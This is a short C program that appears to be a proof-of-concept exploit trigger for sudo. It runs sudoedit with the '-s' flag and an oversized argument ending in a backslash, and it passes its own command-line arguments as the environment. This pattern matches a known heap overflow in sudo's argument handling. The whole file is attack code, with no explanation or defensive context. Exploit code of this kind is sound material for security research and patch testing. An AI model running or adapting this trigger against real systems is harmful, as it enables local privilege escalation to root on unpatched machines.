

int main(int argc, char *argv[], char *envp[])
{
    
    char* _argv[] = {
        "/usr/local/bin/sudoedit",
        "-A", "-s", "2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222\\",
        0
    };
    execve("/usr/local/bin/sudoedit", _argv, &argv[1]);
}
